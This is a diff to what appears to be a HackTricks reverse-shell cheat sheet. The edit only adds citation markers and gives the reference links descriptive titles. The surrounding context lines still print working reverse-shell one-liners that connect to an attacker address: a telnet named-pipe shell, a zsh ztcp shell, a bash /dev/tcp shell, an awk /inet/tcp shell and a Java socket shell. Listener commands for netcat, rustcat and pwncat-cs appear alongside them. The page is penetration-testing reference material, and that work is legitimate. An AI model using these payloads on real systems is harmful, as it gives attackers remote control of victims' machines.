@@ -152,7 +152,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 while true; do nc -l <port>; done
 ```
 
-To send the command write it down, press enter and press CTRL+D (to stop STDIN)
+To send the command write it down, press enter and press CTRL+D (to stop STDIN)<sup>[[3]](#references)</sup>
 
 **Victim**
 
@@ -282,7 +282,7 @@ zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPL
 
 ## Rustcat (rcat)
 
-[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – modern netcat-like listener written in Rust (packaged in Kali since 2024).
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – modern netcat-like listener written in Rust (packaged in Kali since 2024).<sup>[[5]](#references)</sup>
 
 ```bash
 # Attacker – interactive TLS listener with history & tab-completion
@@ -301,7 +301,7 @@ Features:
 
 ## pwncat-cs
 
-If you already have **any raw reverse shell** but want a listener that automatically tries to upgrade it into a more usable session, `pwncat-cs` is a good modern replacement for a plain `nc -lvnp` listener.
+If you already have **any raw reverse shell** but want a listener that automatically tries to upgrade it into a more usable session, `pwncat-cs` is a good modern replacement for a plain `nc -lvnp` listener.<sup>[[7]](#references)</sup>
 
 ```bash
 # Attacker - catch a plain reverse shell and auto-upgrade it when possible
@@ -312,11 +312,11 @@ pwncat-cs -lp 4444
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
 ```
 
-It also supports **encrypted** `ssl-bind` and `ssl-connect` channels, so you can pair it with `ncat --ssl` or `socat OPENSSL:` payloads when you need transport encryption.
+It also supports **encrypted** `ssl-bind` and `ssl-connect` channels, so you can pair it with `ncat --ssl` or `socat OPENSSL:` payloads when you need transport encryption.<sup>[[7]](#references)</sup>
 
 ## revsh (encrypted & pivot-ready)
 
-`revsh` is a tiny C client/server that provides a full TTY over an **encrypted Diffie-Hellman tunnel** and can optionally attach a **TUN/TAP** interface for reverse VPN-like pivoting.
+`revsh` is a tiny C client/server that provides a full TTY over an **encrypted Diffie-Hellman tunnel** and can optionally attach a **TUN/TAP** interface for reverse VPN-like pivoting.<sup>[[6]](#references)</sup>
 
 ```bash
 # Build (or grab a pre-compiled binary from the releases page)
@@ -399,7 +399,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 while true; do nc -l 79; done
 ```
 
-To send the command write it down, press enter and press CTRL+D (to stop STDIN)
+To send the command write it down, press enter and press CTRL+D (to stop STDIN)<sup>[[3]](#references)</sup>
 
 **Victim**
 
@@ -464,13 +464,13 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 ## References
 
-- [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
-- [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
-- [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
-- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
-- [https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat)
-- [https://gtfobins.org/gtfobins/busybox/](https://gtfobins.org/gtfobins/busybox/)
+- [1] [Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+- [2] [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
+- [3] [Using Whois and Finger for Reverse Shells](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
+- [4] [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [5] [rustcat - The modern port listener and reverse shell](https://github.com/robiot/rustcat)
+- [6] [revsh - A reverse shell with terminal support, data tunneling, and advanced pivoting capabilities](https://github.com/emptymonkey/revsh)
+- [7] [pwncat (pwncat-cs) - post-exploitation platform](https://github.com/calebstewart/pwncat)
+- [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
 
 {{#include ../../banners/hacktricks-training.md}}
